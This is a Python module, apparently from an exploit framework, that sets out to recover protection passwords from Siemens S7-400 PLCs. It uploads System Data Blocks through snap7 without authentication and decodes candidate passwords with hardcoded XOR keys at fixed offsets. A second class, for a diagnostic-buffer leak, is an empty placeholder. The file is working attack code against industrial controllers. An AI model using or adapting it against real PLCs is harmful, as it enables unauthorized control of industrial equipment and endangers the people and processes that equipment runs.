"""
Siemens S7-400 Password Recovery Exploits

Exploits for recovering passwords from S7-400 series PLCs.
"""

from typing import Any, Dict, List, Optional


class S7_400_SDBExtract:
    """
    S7-400 System Data Block Extraction

    Similar to S7-300, the S7-400 stores password information
    in System Data Blocks that can sometimes be read without authentication.

    S7-400 uses a slightly different SDB structure than S7-300.
    """

    name = "S7-400 SDB Extraction"
    description = "Extract password from System Data Block"
    affected_vendors = ["Siemens"]
    affected_models = ["S7-400", "S7-410", "S7-412", "S7-414", "S7-416", "S7-417"]
    affected_firmware = ["V1.x", "V2.x", "V3.x", "V4.x", "V5.x"]
    cve = None

    # S7-400 uses different XOR patterns
    XOR_KEY_V4 = bytes([0x55, 0xaa, 0x55, 0xaa, 0x55, 0xaa, 0x55, 0xaa])
    XOR_KEY_V5 = bytes([0x3c, 0x9e, 0x7d, 0x2f, 0x8b, 0x4a, 0x1e, 0xc6])

    def check_applicable(self, target) -> bool:
        """Check if exploit applies"""
        if not target.device:
            return False

        info = target.device.get_device_info()
        model = info.model.lower()

        return 's7-400' in model or 's7-4' in model

    def execute(self, target) -> Dict[str, Any]:
        """Execute SDB extraction for S7-400"""
        result = {
            'success': False,
            'password': None,
            'message': None,
        }

        if not target.device:
            result['message'] = "No device connection"
            return result

        try:
            import snap7
            client = target.device._client

            # S7-400 uses SDB 1 for some protection info and SDB 7 for others
            sdb_numbers = [7, 1, 100]

            for sdb_num in sdb_numbers:
                try:
                    sdb_data = client.full_upload(snap7.types.Block.SDB, sdb_num)

                    if sdb_data and len(sdb_data) > 20:
                        password = self._extract_password(bytes(sdb_data), sdb_num)
                        if password:
                            result['success'] = True
                            result['password'] = password
                            result['message'] = f"Password extracted from SDB {sdb_num}"
                            return result

                except Exception:
                    continue

            result['message'] = "No password found in SDBs"

        except Exception as e:
            result['message'] = f"Exploit failed: {str(e)}"

        return result

    def _extract_password(self, sdb_data: bytes, sdb_num: int) -> Optional[str]:
        """Extract password from SDB data"""
        # S7-400 SDB structure varies by version
        # Try multiple offsets

        offsets = [0x12, 0x14, 0x20, 0x24]

        for offset in offsets:
            if offset + 8 > len(sdb_data):
                continue

            password_bytes = sdb_data[offset:offset + 8]

            # Try different XOR keys
            for xor_key in [self.XOR_KEY_V4, self.XOR_KEY_V5]:
                decrypted = bytes([
                    password_bytes[i] ^ xor_key[i % len(xor_key)]
                    for i in range(len(password_bytes))
                ])

                try:
                    password = decrypted.decode('ascii').rstrip('\x00')
                    if password and password.isprintable() and len(password) >= 1:
                        return password
                except UnicodeDecodeError:
                    continue

            # Try without XOR (cleartext)
            try:
                password = password_bytes.decode('ascii').rstrip('\x00')
                if password and password.isprintable() and len(password) >= 1:
                    return password
            except UnicodeDecodeError:
                continue

        return None


class S7_400_CPUInfoLeak:
    """
    S7-400 CPU Information Leak

    Some S7-400 firmware versions leak password-related information
    in the CPU diagnostic buffer.
    """

    name = "S7-400 CPU Info Leak"
    description = "Extract information from CPU diagnostic buffer"
    affected_vendors = ["Siemens"]
    affected_models = ["S7-400", "S7-414", "S7-416"]
    affected_firmware = ["V3.x", "V4.x"]
    cve = None

    def check_applicable(self, target) -> bool:
        """Check if exploit applies"""
        if not target.device:
            return False

        info = target.device.get_device_info()
        return 's7-400' in info.model.lower()

    def execute(self, target) -> Dict[str, Any]:
        """Execute diagnostic buffer extraction"""
        result = {
            'success': False,
            'password': None,
            'message': "Diagnostic buffer exploit not implemented",
        }

        # This exploit is more complex and requires specific
        # firmware analysis - placeholder for now

        return result
